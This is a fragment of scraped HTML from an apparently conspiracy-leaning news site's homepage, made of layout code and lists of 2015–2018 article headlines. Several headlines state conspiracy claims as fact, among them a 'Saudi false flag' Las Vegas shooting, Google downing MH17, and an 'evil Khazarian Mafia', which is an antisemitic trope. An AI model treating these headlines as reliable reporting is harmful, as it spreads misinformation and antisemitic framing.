<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/13/washington-post-winston-churchill-a-mass-murderer/" rel="bookmark" title="Washington Post: Winston Churchill “a mass murderer”">Washington Post: Winston Churchill “a mass murderer”</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-13T17:58:21+00:00">March 13, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/08/rudolf-hess-the-truth-3/" rel="bookmark" title="Rudolf Hess &#8211; The Truth (3)"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Bf-110-2-80x60.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Bf-110-2-80x60.jpg 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Bf-110-2-265x198.jpg 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Rudolf Hess &#8211; The Truth (3)" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/08/rudolf-hess-the-truth-3/" rel="bookmark" title="Rudolf Hess &#8211; The Truth (3)">Rudolf Hess &#8211; The Truth (3)</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-08T12:34:40+00:00">March 8, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/02/17/forgotten-laura-and-the-bush-murders/" rel="bookmark" title="Forgotten:  Laura and the Bush Murders"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/ScreenHunter-454-80x60.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/ScreenHunter-454-80x60.jpg 80w, https://www.veteranstoday.com/wp-content/uploads/2018/02/ScreenHunter-454-265x198.jpg 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Forgotten:  Laura and the Bush Murders" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/02/17/forgotten-laura-and-the-bush-murders/" rel="bookmark" title="Forgotten:  Laura and the Bush Murders">Forgotten: Laura and the Bush Murders</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-02-17T13:45:11+00:00">February 17, 2018</time></span> </div>
</div>
</div>

</div></div> </div></div></div><div class="wpb_column vc_column_container td-pb-span4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_19 td_uid_99_5aaf778c54203_rand td-pb-border-top td_block_template_1 td-column-1" data-td-block-uid="td_uid_99_5aaf778c54203"><script>var block_td_uid_99_5aaf778c54203 = new tdBlock();
block_td_uid_99_5aaf778c54203.id = "td_uid_99_5aaf778c54203";
block_td_uid_99_5aaf778c54203.atts = '{"limit":"4","sort":"","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"70361","category_ids":"","custom_title":"Veterans News","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_99_5aaf778c54203_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_99_5aaf778c54203_rand","tdc_css_class_style":"td_uid_99_5aaf778c54203_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_99_5aaf778c54203.td_column_number = "1";
block_td_uid_99_5aaf778c54203.block_type = "td_block_19";
block_td_uid_99_5aaf778c54203.post_count = "4";
block_td_uid_99_5aaf778c54203.found_posts = "1433";
block_td_uid_99_5aaf778c54203.header_color = "";
block_td_uid_99_5aaf778c54203.ajax_pagination_infinite_stop = "";
block_td_uid_99_5aaf778c54203.max_num_pages = "359";
tdBlocksArray.push(block_td_uid_99_5aaf778c54203);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">Veterans News</span></h4></div><div id=td_uid_99_5aaf778c54203 class="td_block_inner td-column-1">
<div class="td_module_mx1 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/truth4troops/" rel="bookmark" title="Support our troops—tell them the truth!"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Kevin-Penn-Magazine4-356x220.jpg" alt="" title="Support our troops—tell them the truth!" /></a></div>
<div class="td-module-meta-info">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/truth4troops/" rel="bookmark" title="Support our troops—tell them the truth!">Support our troops—tell them the truth!</a></h3> <div class="td-editor-date">
<span class="td-author-date">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T09:36:03+00:00">March 18, 2018</time></span> </span>
</div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/top-5-veterans-news-march-17th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 17th, 2018"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-80x60.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-80x60.gif 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-2-265x198.gif 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Top 5 Veterans News:  March 17th, 2018" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/top-5-veterans-news-march-17th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 17th, 2018">Top 5 Veterans News: March 17th, 2018</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T23:21:53+00:00">March 16, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/11/top-5-veterans-news-march-10th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 11th, 2018"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-80x60.gif" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-80x60.gif 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/Top-5-Veterans-News-Stories-February-20th-1-265x198.gif 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Top 5 Veterans News:  March 11th, 2018" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/11/top-5-veterans-news-march-10th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 11th, 2018">Top 5 Veterans News: March 11th, 2018</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-11T11:16:06+00:00">March 11, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/07/top-5-veterans-news-march-7th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 7th, 2018"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-80x60.jpg" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-80x60.jpg 80w, https://www.veteranstoday.com/wp-content/uploads/2018/02/Top-5-Veterans-stories-february-9-1-265x198.jpg 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Top 5 Veterans News:  March 7th, 2018" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/07/top-5-veterans-news-march-7th-2018/" rel="bookmark" title="Top 5 Veterans News:  March 7th, 2018">Top 5 Veterans News: March 7th, 2018</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-07T12:15:10+00:00">March 7, 2018</time></span> </div>
</div>
</div>
</div></div> </div></div></div><div class="wpb_column vc_column_container td-pb-span4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_19 td_uid_100_5aaf778c56209_rand td-pb-border-top td_block_template_1 td-column-1" data-td-block-uid="td_uid_100_5aaf778c56209"><script>var block_td_uid_100_5aaf778c56209 = new tdBlock();
block_td_uid_100_5aaf778c56209.id = "td_uid_100_5aaf778c56209";
block_td_uid_100_5aaf778c56209.atts = '{"limit":"4","sort":"","post_ids":"","tag_slug":"","autors_id":"35","installed_post_types":"","category_id":"15","category_ids":"","custom_title":"Carol Duff\u0027s Health Center","custom_url":"https:\/\/www.veteranstoday.com\/author\/carol\/","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"","header_text_color":"","ajax_pagination_infinite_stop":"","td_column_number":1,"td_ajax_preloading":"","td_ajax_filter_type":"","td_ajax_filter_ids":"","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_100_5aaf778c56209_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_100_5aaf778c56209_rand","tdc_css_class_style":"td_uid_100_5aaf778c56209_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_100_5aaf778c56209.td_column_number = "1";
block_td_uid_100_5aaf778c56209.block_type = "td_block_19";
block_td_uid_100_5aaf778c56209.post_count = "4";
block_td_uid_100_5aaf778c56209.found_posts = "56";
block_td_uid_100_5aaf778c56209.header_color = "";
block_td_uid_100_5aaf778c56209.ajax_pagination_infinite_stop = "";
block_td_uid_100_5aaf778c56209.max_num_pages = "14";
tdBlocksArray.push(block_td_uid_100_5aaf778c56209);
</script><div class="td-block-title-wrap"><h4 class="block-title"><a href="https://www.veteranstoday.com/author/carol/" class="td-pulldown-size">Carol Duff&#039;s Health Center</a></h4></div><div id=td_uid_100_5aaf778c56209 class="td_block_inner td-column-1">
<div class="td_module_mx1 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/16/deaths-of-despair-not-all-states-rank-the-same/" rel="bookmark" title="Deaths of Despair:  Not All States Rank the Same"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/despair-356x220.png" alt="" title="Deaths of Despair:  Not All States Rank the Same" /><span class="td-video-play-ico"><img width="40" height="40" class="td-retina" src="https://www.veteranstoday.com/wp-content/themes/Newspaper/images/icons/ico-video-large.png" alt="video" /></span></a></div>
<div class="td-module-meta-info">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/16/deaths-of-despair-not-all-states-rank-the-same/" rel="bookmark" title="Deaths of Despair:  Not All States Rank the Same">Deaths of Despair: Not All States Rank the Same</a></h3> <div class="td-editor-date">
<span class="td-author-date">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/carol/">Carol Duff, MSN, BA, RN</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-16T17:44:47+00:00">March 16, 2018</time></span> </span>
</div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/10/medical-alert-infants-dying-from-flu/" rel="bookmark" title="Medical Alert: Infants Dying from Flu"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/flu-80x60.png" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/flu-80x60.png 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/flu-265x198.png 265w, https://www.veteranstoday.com/wp-content/uploads/2018/03/flu-534x405.png 534w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Medical Alert: Infants Dying from Flu" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/10/medical-alert-infants-dying-from-flu/" rel="bookmark" title="Medical Alert: Infants Dying from Flu">Medical Alert: Infants Dying from Flu</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-10T11:24:40+00:00">March 10, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/09/medical-marijuana-does-not-increase-recreational-use/" rel="bookmark" title="Medical Marijuana Does Not Increase Recreational Use"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/plant-80x60.png" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/plant-80x60.png 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/plant-265x198.png 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Medical Marijuana Does Not Increase Recreational Use" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/09/medical-marijuana-does-not-increase-recreational-use/" rel="bookmark" title="Medical Marijuana Does Not Increase Recreational Use">Medical Marijuana Does Not Increase Recreational Use</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-09T21:09:24+00:00">March 9, 2018</time></span> </div>
</div>
</div>
<div class="td_module_mx2 td_module_wrap td-animation-stack">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/04/doctors-of-death-the-interstate-loop-hole/" rel="bookmark" title="Doctors of Death: The Interstate Loop Hole"><img width="80" height="60" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/gavel-80x60.png" srcset="https://www.veteranstoday.com/wp-content/uploads/2018/03/gavel-80x60.png 80w, https://www.veteranstoday.com/wp-content/uploads/2018/03/gavel-265x198.png 265w" sizes="(max-width: 80px) 100vw, 80px" alt="" title="Doctors of Death: The Interstate Loop Hole" /></a></div>
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/04/doctors-of-death-the-interstate-loop-hole/" rel="bookmark" title="Doctors of Death: The Interstate Loop Hole">Doctors of Death: The Interstate Loop Hole</a></h3> <div class="td-module-meta-info">
<span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-04T11:01:25+00:00">March 4, 2018</time></span> </div>
</div>
</div>
</div></div> </div></div></div></div><div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_big_grid_5 td_uid_101_5aaf778c59d5e_rand td-grid-style-6 td-hover-1 td-big-grids td-pb-border-top td_block_template_1" data-td-block-uid="td_uid_101_5aaf778c59d5e"><div id=td_uid_101_5aaf778c59d5e class="td_block_inner"><div class="td-big-grid-wrapper">
<div class="td_module_mx12 td-animation-stack td-big-grid-post-0 td-big-grid-post td-small-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/18/us-commissions-1-nuclear-sub-russia-3/" rel="bookmark" title="US Commissions 1 Nuclear Sub, Russia 3"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1059220686-356x220.jpg" alt="" title="US Commissions 1 Nuclear Sub, Russia 3" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/18/us-commissions-1-nuclear-sub-russia-3/" rel="bookmark" title="US Commissions 1 Nuclear Sub, Russia 3">US Commissions 1 Nuclear Sub, Russia 3</a></h3> </div>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/sputnik/">Media Partner - Sputnik News</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-18T10:45:16+00:00">March 18, 2018</time></span> </div>
</div>
</div>
</div>
<div class="td_module_mx12 td-animation-stack td-big-grid-post-1 td-big-grid-post td-small-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/14/ads-vt-dubai-police-considers-blimp-in-fresh-strategy-to-help-fight-crime-without-police-officers/" rel="bookmark" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/ScreenHunter-502-356x220.jpg" alt="" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/14/ads-vt-dubai-police-considers-blimp-in-fresh-strategy-to-help-fight-crime-without-police-officers/" rel="bookmark" title="ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;">ADS/VT: Dubai police considers blimp in fresh strategy to help fight crime &#8216;without police officers&#8217;</a></h3> </div>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-14T10:03:35+00:00">March 14, 2018</time></span> </div>
</div>
</div>
</div>
<div class="td_module_mx12 td-animation-stack td-big-grid-post-2 td-big-grid-post td-small-thumb">
<div class="td-module-thumb"><a href="https://www.veteranstoday.com/2018/03/13/russias-pantsir-air-defense-system-may-go-hypersonic/" rel="bookmark" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic"><img width="356" height="220" class="entry-thumb" src="https://www.veteranstoday.com/wp-content/uploads/2018/03/1046170188-356x220.jpg" alt="" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic" /></a></div> <div class="td-meta-info-container">
<div class="td-meta-align">
<div class="td-big-grid-meta">
<a href="https://www.veteranstoday.com/category/armed-forces/" class="td-post-category">Military</a> <h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/03/13/russias-pantsir-air-defense-system-may-go-hypersonic/" rel="bookmark" title="Russia&#8217;s Pantsir Air Defense System May Go Hypersonic">Russia&#8217;s Pantsir Air Defense System May Go Hypersonic</a></h3> </div>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/sputnik/">Media Partner - Sputnik News</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-03-13T13:55:33+00:00">March 13, 2018</time></span> </div>
</div>
</div>
</div>
</div><div class="clearfix"></div></div></div> <div class="td-a-rec td-a-rec-id-custom_ad_3  td_uid_102_5aaf778c5b9a4_rand td_block_template_1"><a href="https://www.hireveterans.com"><img width="728" height="105" src='https://www.veteranstoday.com/wp-content/uploads/2017/11/hv728-105.jpg' alt='' title='hv728-105' srcset='https://www.veteranstoday.com/wp-content/uploads/2017/11/hv728-105.jpg 728w, https://www.veteranstoday.com/wp-content/uploads/2017/11/hv728-105-320x46.jpg 320w, https://www.veteranstoday.com/wp-content/uploads/2017/11/hv728-105-640x92.jpg 640w, https://www.veteranstoday.com/wp-content/uploads/2017/11/hv728-105-696x100.jpg 696w' sizes='(max-width: 728px) 100vw, 728px' /></a>
</div></div></div></div></div><div class="vc_row wpb_row td-pb-row"><div class="wpb_column vc_column_container td-pb-span12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="td_block_wrap td_block_9 td_uid_103_5aaf778c5cf67_rand td-pb-border-top td_block_template_1 td-column-3 td_block_padding td_block_bot_line" data-td-block-uid="td_uid_103_5aaf778c5cf67">
<style>
body .td_uid_103_5aaf778c5cf67_rand .td_module_wrap:hover .entry-title a,
            body .td_uid_103_5aaf778c5cf67_rand .td-pulldown-filter-link:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-subcat-item a:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-subcat-item .td-cur-simple-item,
            body .td_uid_103_5aaf778c5cf67_rand .td_quote_on_blocks,
            body .td_uid_103_5aaf778c5cf67_rand .td-opacity-cat .td-post-category:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-opacity-read .td-read-more a:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-opacity-author .td-post-author-name a:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-instagram-user a {
                color: #990000;
            }

            body .td_uid_103_5aaf778c5cf67_rand .td-next-prev-wrap a:hover,
            body .td_uid_103_5aaf778c5cf67_rand .td-load-more-wrap a:hover {
                background-color: #990000;
                border-color: #990000;
            }

            body .td_uid_103_5aaf778c5cf67_rand .block-title > *,
            body .td_uid_103_5aaf778c5cf67_rand .td-trending-now-title,
            body .td_uid_103_5aaf778c5cf67_rand .td-read-more a,
            body .td_uid_103_5aaf778c5cf67_rand .td-weather-information:before,
            body .td_uid_103_5aaf778c5cf67_rand .td-weather-week:before,
            body .td_uid_103_5aaf778c5cf67_rand .td-subcat-dropdown:hover .td-subcat-more,
            body .td_uid_103_5aaf778c5cf67_rand .td-exchange-header:before,
            body .td-footer-wrapper .td_uid_103_5aaf778c5cf67_rand .td-post-category,
            body .td_uid_103_5aaf778c5cf67_rand .td-post-category:hover {
                background-color: #990000;
            }
            body .td-footer-wrapper .td_uid_103_5aaf778c5cf67_rand .block-title > * {
                padding: 6px 7px 5px;
                line-height: 1;
            }

            body .td_uid_103_5aaf778c5cf67_rand .block-title {
                border-color: #990000;
            }

            
            body .td_uid_103_5aaf778c5cf67_rand .block-title > *,
            body .td_uid_103_5aaf778c5cf67_rand .td-trending-now-title {
                color: #ffffff;
            }
</style><script>var block_td_uid_103_5aaf778c5cf67 = new tdBlock();
block_td_uid_103_5aaf778c5cf67.id = "td_uid_103_5aaf778c5cf67";
block_td_uid_103_5aaf778c5cf67.atts = '{"limit":"21","sort":"popular","post_ids":"","tag_slug":"","autors_id":"","installed_post_types":"","category_id":"","category_ids":"","custom_title":"Top 20 Most Read Articles (All-Time)","custom_url":"","show_child_cat":"","sub_cat_ajax":"","ajax_pagination":"","header_color":"#990000","header_text_color":"#ffffff","ajax_pagination_infinite_stop":"","td_column_number":3,"td_ajax_preloading":"","td_ajax_filter_type":"td_author_ids_filter","td_ajax_filter_ids":"7,92","td_filter_default_txt":"All","color_preset":"","border_top":"","class":"td_uid_103_5aaf778c5cf67_rand","el_class":"","offset":"","css":"","tdc_css":"","tdc_css_class":"td_uid_103_5aaf778c5cf67_rand","tdc_css_class_style":"td_uid_103_5aaf778c5cf67_rand_style","live_filter":"","live_filter_cur_post_id":"","live_filter_cur_post_author":"","block_template_id":""}';
block_td_uid_103_5aaf778c5cf67.td_column_number = "3";
block_td_uid_103_5aaf778c5cf67.block_type = "td_block_9";
block_td_uid_103_5aaf778c5cf67.post_count = "21";
block_td_uid_103_5aaf778c5cf67.found_posts = "17846";
block_td_uid_103_5aaf778c5cf67.header_color = "#990000";
block_td_uid_103_5aaf778c5cf67.ajax_pagination_infinite_stop = "";
block_td_uid_103_5aaf778c5cf67.max_num_pages = "850";
tdBlocksArray.push(block_td_uid_103_5aaf778c5cf67);
</script><div class="td-block-title-wrap"><h4 class="block-title"><span class="td-pulldown-size">Top 20 Most Read Articles (All-Time)</span></h4><div class="td-pulldown-syle-default td-subcat-filter" id="td_pulldown_td_uid_103_5aaf778c5cf67"><ul class="td-subcat-list" id="td_pulldown_td_uid_103_5aaf778c5cf67_list"><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_104_5aaf778cc2c0c" data-td_filter_value="" data-td_block_id="td_uid_103_5aaf778c5cf67" href="#">All</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_105_5aaf778cc2c4e" data-td_filter_value="92" data-td_block_id="td_uid_103_5aaf778c5cf67" href="#">Jim W. Dean, Managing Editor</a></li><li class="td-subcat-item"><a class="td-subcat-link" id="td_uid_106_5aaf778cc2c8b" data-td_filter_value="7" data-td_block_id="td_uid_103_5aaf778c5cf67" href="#">Gordon Duff, Senior Editor</a></li></ul><div class="td-subcat-dropdown"><div class="td-subcat-more" aria-haspopup="true"><span>More</span><i class="td-icon-read-down"></i></div><ul class="td-pulldown-filter-list"></ul></div></div></div><div id=td_uid_103_5aaf778c5cf67 class="td_block_inner">
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2015/03/08/the-hidden-history-of-the-incredibly-evil-khazarian-mafia/" rel="bookmark" title="The Hidden History of the Incredibly Evil Khazarian Mafia (Updated)">The Hidden History of the Incredibly Evil Khazarian Mafia (Updated)</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/jim/">Preston James, Ph.D</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2015-03-08T21:41:42+00:00">March 8, 2015</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2015/03/08/the-hidden-history-of-the-incredibly-evil-khazarian-mafia/#comments">118</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2016/09/19/22-billion-dollars-found-photos-of-a-mexican-drug-lords-home-after-being-raided/" rel="bookmark" title="22 Billion Dollars found: Photos of a Mexican drug lord&#8217;s home after being raided">22 Billion Dollars found: Photos of a Mexican drug lord&#8217;s home after being raided</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/iangreenhalgh/">Ian Greenhalgh</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2016-09-19T10:54:08+00:00">September 19, 2016</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2016/09/19/22-billion-dollars-found-photos-of-a-mexican-drug-lords-home-after-being-raided/#comments">5</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/10/30/seal6/" rel="bookmark" title="Did Seal Team 6 members strangle Green Beret to cover up fake &#8220;Bin Laden killing&#8221;?">Did Seal Team 6 members strangle Green Beret to cover up fake &#8220;Bin Laden...</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/barrett/">Kevin Barrett</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-10-30T09:01:50+00:00">October 30, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/10/30/seal6/#comments">18</a></div> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2017/11/27/confirmed-las-vegas-shootings-a-saudi-false-flag/" rel="bookmark" title="Confirmed: Las Vegas Shootings a Saudi False Flag">Confirmed: Las Vegas Shootings a Saudi False Flag</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2017-11-27T14:55:43+00:00">November 27, 2017</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2017/11/27/confirmed-las-vegas-shootings-a-saudi-false-flag/#comments">13</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2016/10/25/top-5-racist-countries/" rel="bookmark" title="Top 5 Most Racist Countries in the World">Top 5 Most Racist Countries in the World</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/punish/">Johnny Punish</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2016-10-25T05:41:10+00:00">October 25, 2016</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2016/10/25/top-5-racist-countries/#comments">19</a></div> </div>
</div>
</div>
</div> 
<div class="td-block-span4">
<div class="td_module_8 td_module_wrap">
<div class="item-details">
<h3 class="entry-title td-module-title"><a href="https://www.veteranstoday.com/2018/01/19/new-evidence-did-google-down-mh-17-killing-238/" rel="bookmark" title="New Evidence: Did Google Down MH 17, Killing 238?">New Evidence: Did Google Down MH 17, Killing 238?</a></h3>
<div class="td-module-meta-info">
<span class="td-post-author-name"><a href="https://www.veteranstoday.com/author/gordonduff/">Gordon Duff, Senior Editor</a> <span>-</span> </span> <span class="td-post-date"><time class="entry-date updated td-module-date" datetime="2018-01-19T14:05:54+00:00">January 19, 2018</time></span> <div class="td-module-comments"><a href="https://www.veteranstoday.com/2018/01/19/new-evidence-did-google-down-mh-17-killing-238/#comments">26</a></div> </div>
</div>
</div>
</div> </div>
<div class="td-block-row">
